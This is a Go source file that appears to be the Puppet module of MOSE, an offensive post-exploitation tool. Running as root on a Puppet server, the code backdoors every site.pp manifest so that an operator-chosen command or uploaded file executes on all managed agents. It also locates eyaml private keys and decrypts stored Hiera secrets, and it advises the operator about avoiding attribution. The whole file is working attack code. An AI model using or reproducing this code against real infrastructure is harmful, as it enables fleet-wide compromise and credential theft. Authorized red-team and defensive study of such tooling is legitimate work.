// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"

	"github.com/master-of-servers/mose/pkg/moseutils"
	"github.com/master-of-servers/mose/pkg/netutils"
	"github.com/master-of-servers/mose/pkg/system"

	"github.com/markbates/pkger"
	"github.com/rs/zerolog/log"
)

type eyamlKeys struct {
	publicKey  string
	privateKey string
}

type command struct {
	ClassName string
	CmdName   string
	Cmd       string
	FileName  string
	FilePath  string
}

var (
	a               = CreateAgent()
	cleanup         bool
	cleanupFile     = a.CleanupFile
	cmd             = a.Cmd
	debug           = a.Debug
	osTarget        = a.OsTarget
	moduleName      = a.PayloadName
	uploadFileName  = a.FileName
	uploadFilePath  = a.RemoteUploadFilePath
	puppetBackupLoc = a.PuppetBackupLoc
	noColor         bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location specified in settings.json")
	flag.BoolVar(&noColor, "d", false, "Disable color output")
	flag.Parse()
}

func cleanAgentOutput(cmdOut string) []string {
	re := regexp.MustCompile(`(\w+\.\w+\.\w+)`)
	newout := moseutils.SliceUniqMap(re.FindAllString(cmdOut, -1))
	return newout
}

func getAgents() []string {
	cmds := []string{"puppet cert list -a", "puppetserver ca list --all"}
	cmdOut := ""
	var err error

	// Find the right command to run
	for _, cmd := range cmds {
		cmdArr := strings.Fields(cmd)
		cmdOut, err = system.RunCommand(cmdArr[0], cmdArr[1:]...)
		if err == nil {
			log.Debug().Msgf("Running %v", cmd)
			break
		}
		log.Debug().Msgf("%v is not working on this system", cmd)
	}

	agents := cleanAgentOutput(cmdOut)
	if err != nil {
		log.Fatal().Msg("This system is not a Puppet Server, exiting.")
	} else if len(agents) == 1 && strings.Contains(agents[0], netutils.GetHostname()) {
		log.Fatal().Msg("The Puppet Server is the only agent, and you've pwned it. Exiting.")
	} else if strings.Contains(cmdOut, "No certificates to list") {
		log.Fatal().Msg("There are no agents configured with this Puppet Server, exiting.")
	}

	return agents
}

// getModules will get existing modules on the puppet server and output them
func getModules(moduleLoc string) []string {
	var modules []string
	// Because the format of the data may vary, we opt to use maps
	var jsonOut map[string]interface{}

	cmdOut, err := system.RunCommand("puppet", "module", "list", "--modulepath", moduleLoc, "--render-as", "json")
	if err != nil {
		log.Log().Msg("Error: Unable to get existing modules")
	}
	err = json.Unmarshal([]byte(cmdOut), &jsonOut)
	if err != nil {
		moseutils.ColorMsgf("Error: Unable to unmarshal %v", jsonOut)
	}
	preParsed := jsonOut["modules_by_path"].(map[string]interface{})
	for key, value := range preParsed {
		switch s := value.(type) {
		default:
		case []interface{}:
			for _, str := range s {
				modules = append(modules, fmt.Sprintf("%v:%v", key, str))
			}
		}
	}
	return modules
}

func getExistingManifests() []string {
	var manifestLocs []string
	fileList, _ := system.GetFileAndDirList([]string{"/etc", "/opt"})
	for _, file := range fileList {
		if strings.Contains(file, "site.pp") && !strings.Contains(file, "~") &&
			!strings.Contains(file, ".bak") && !strings.Contains(file, "#") {
			manifestLocs = append(manifestLocs, file)
		}
	}
	if len(manifestLocs) == 0 {
		log.Fatal().Msg("Unable to locate a manifest file to backdoor, exiting.")
	}
	return manifestLocs
}

// backupManifest will create a backup of the existing manifest
func backupManifest(manifestLoc string) {
	path := manifestLoc
	if puppetBackupLoc != "" {
		path = filepath.Join(puppetBackupLoc, filepath.Base(manifestLoc))
	}
	if !system.FileExists(path + ".bak.mose") {
		_ = system.CpFile(manifestLoc, path+".bak.mose")
		return
	}
	moseutils.ColorMsgf("Backup of the manifest (%v.bak.mose) already exists.", manifestLoc)
	return
}

func backdoorManifest(manifestLoc string) {
	// TODO: Offer ability to review nodes here and choose which ones to target
	insertString := "  include " + moduleName + "\n"
	nodeLines := regexp.MustCompile(`(?sm)}\s*?node\b`)
	eof := regexp.MustCompile(`}\s*?$`)
	comments := regexp.MustCompile(`#.*`)

	fileContent, err := ioutil.ReadFile(manifestLoc)
	if err != nil {
		log.Fatal().Err(err).Msg("Failed to backdoor the manifest located at %s, exiting.")
	}

	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))
	content = fmt.Sprint(eof.ReplaceAllString(content, insertString+"}\n"))
	content = fmt.Sprint(nodeLines.ReplaceAllString(content, insertString+"}\nnode"))

	err = ioutil.WriteFile(manifestLoc, []byte(content), 0644)
	if err != nil {
		log.Fatal().Err(err).Msgf("Failed to backdoor the manifest located at %s, exiting.", manifestLoc)
	}
}

func getPuppetCodeLoc(manifestLoc string) string {
	d, _ := filepath.Split(manifestLoc)
	return filepath.Clean(filepath.Join(d, "../"))
}

func generateModule(moduleManifest string, cmd string) bool {
	puppetCommand := command{
		ClassName: moduleName,
		CmdName:   moduleName,
		Cmd:       cmd,
		FileName:  uploadFileName,
		FilePath:  uploadFilePath,
	}
	s, err := pkger.Open("/tmpl/puppetModule.tmpl")

	if uploadFileName != "" {
		s, err = pkger.Open("/tmpl/puppetFileUploadModule.tmpl")
	}

	if err != nil {
		log.Fatal().Err(err).Msg("Parse failure pkger: ")
	}
	defer s.Close()

	dat := new(strings.Builder)
	_, err = io.Copy(dat, s)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	t, err := template.New("puppetModule").Parse(dat.String())

	if err != nil {
		log.Debug().Msg(dat.String())
		log.Fatal().Err(err).Msg("Parse failure template: ")
	}

	f, err := os.Create(moduleManifest)

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	err = t.Execute(f, puppetCommand)

	if err != nil {
		log.Fatal().Err(err).Msg("Execute: ")
	}

	f.Close()

	return true
}

func createModule(manifestLoc string, moduleName string, cmd string) {
	puppetCodeLoc := getPuppetCodeLoc(manifestLoc)
	moduleLoc := filepath.Join(puppetCodeLoc, "modules", moduleName)
	moduleFolders := []string{filepath.Join(moduleLoc, "manifests")}
	moduleManifest := filepath.Join(moduleLoc, "manifests", "init.pp")
	if system.CreateDirectories(moduleFolders) && generateModule(moduleManifest, cmd) {
		moseutils.ColorMsgf("Successfully created the %s module at %s", moduleName, moduleManifest)
		moseutils.ColorMsgf("Adding folder %s to cleanup file", moduleFolders)
		// Track the folders for clean up purposes
		moseutils.TrackChanges(cleanupFile, moduleLoc)
		if uploadFileName != "" {
			moduleFiles := filepath.Join(moduleLoc, "files")

			system.CreateDirectories([]string{moduleFiles})
			moseutils.ColorMsgf("Copying %s to module location %s", uploadFileName, moduleFiles)
			_ = system.CpFile(uploadFileName, filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
			if err := os.Chmod(filepath.Join(moduleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal().Err(err).Msg("")
			}
			moseutils.ColorMsgf("Successfully copied and set the proper permissions for %s", filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
		}
	} else {
		log.Fatal().Msgf("Failed to create %s module", moduleName)
	}
}

func getSecretKeys() map[string]*eyamlKeys {
	keys := make(map[string]*eyamlKeys)
	keyFiles, _ := system.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/root", "/etc/eyaml"}, []string{".pem"}, []string{}, []string{})
	if len(keyFiles) == 0 {
		log.Fatal().Msg("Unable to find any files containing keys used with eyaml, exiting.")
	}
	for _, key := range keyFiles {
		if strings.Contains(key, "pkcs7") {
			d, b := filepath.Split(key)

			if _, ok := keys[d]; !ok {
				keys[d] = &eyamlKeys{}
			}
			k := keys[d]

			if strings.Contains(key, "public") {
				k.publicKey = filepath.Base(key)

			} else if strings.Contains(key, "private") {
				log.Debug().Msg(key)
				k.privateKey = b
			}
		}
	}
	return keys
}

func findHieraSecrets() {
	// Detect if the eyaml binary exists
	exists, eyamlFile := system.FindFile("eyaml", []string{"/bin", "/home", "/opt", "/root", "/usr"})
	if !exists {
		log.Printf("Eyaml not found, no need to find secrets")
		return
	}
	secretKeys := getSecretKeys()
	puppetFiles, _ := system.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/home", "/opt", "/root", "/var"}, []string{".pp", ".yaml", ".yml"}, []string{}, []string{})

	if len(puppetFiles) == 0 {
		log.Fatal().Msg("Unable to find any chef files, exiting.")
	}
	// Matches for secrets
	reg := regexp.MustCompile(`(?ms)ENC\[.+?\]`)
	var matches []string
	// Translate secrets on the fly
	for _, file := range puppetFiles {
		// Grep for ENC[
		matches = system.GrepFile(file, reg)
		if len(matches) > 0 {
			moseutils.ColorMsgf("Found secret(s) in file: %s", file)
			for k := range secretKeys {
				res, err := system.RunCommand(eyamlFile, "decrypt",
					"--pkcs7-public-key="+k+secretKeys[k].publicKey,
					"--pkcs7-private-key="+k+secretKeys[k].privateKey, "-f", filepath.Join(filepath.Dir(file), filepath.Base(file)))

				if err != nil {
					log.Printf("Error running command: %s decrypt -f %s %v", eyamlFile, file, err)
				}
				if !strings.Contains(res, "bad decrypt") {
					moseutils.ColorMsgf("%s", res)
				}
			}
		}
	}
}

func doCleanup(manifestLocs []string) {
	moseutils.TrackChanges(cleanupFile, cleanupFile)
	ans, err := moseutils.AskUserQuestion("Would you like to remove all files created by running MOSE previously? ", osTarget)
	if err != nil {
		log.Fatal().Msg("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, ans)

	for _, manifestLoc := range manifestLocs {
		path := manifestLoc
		if puppetBackupLoc != "" {
			path = filepath.Join(puppetBackupLoc, filepath.Base(manifestLoc))
		}

		path = path + ".bak.mose"

		if !system.FileExists(path) {
			moseutils.ColorMsgf("Backup file %s does not exist, skipping", path)
			continue
		}
		ans2 := false
		if !ans {
			ans2, err = moseutils.AskUserQuestion(fmt.Sprintf("Overwrite %s with %s", manifestLoc, path), osTarget)
			if err != nil {
				log.Fatal().Err(err).Msg("Quitting...")
			}
		}
		if ans || ans2 {
			_ = system.CpFile(path, manifestLoc)
			os.Remove(path)
		}
	}
	os.Exit(0)

}

func main() {
	moseutils.NOCOLOR = noColor
	moseutils.SetupLogger(debug)
	system.CheckRoot()
	manifestLocs := getExistingManifests()

	if cleanup {
		log.Log().Msg("Cleanup")
		doCleanup(manifestLocs)
		os.Exit(0)
	}

	if uploadFilePath != "" {
		moseutils.TrackChanges(cleanupFile, uploadFilePath)
	}

	for _, manifestLoc := range manifestLocs {
		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", osTarget); ans && err == nil {
			backupManifest(manifestLoc)
		} else if err != nil {
			log.Fatal().Err(err).Msg("Quitting...")
		}

		if uploadFileName != "" {
			moseutils.ColorMsgf("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, uploadFileName)
		} else {
			moseutils.ColorMsgf("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
		}

		backdoorManifest(manifestLoc)
		modules := getModules(getPuppetCodeLoc(manifestLoc) + "/modules")
		moseutils.ColorMsgf("The following modules were found: %v", modules)
		createModule(manifestLoc, moduleName, cmd)
	}
	agents := getAgents()
	log.Info().Msgf("The following puppet agents were identified: %q", agents)

	log.Info().Msg("Attempting to find secrets, please wait...")
	findHieraSecrets()
	log.Log().Msg("MOSE has finished, exiting.")
	os.Exit(0)
}
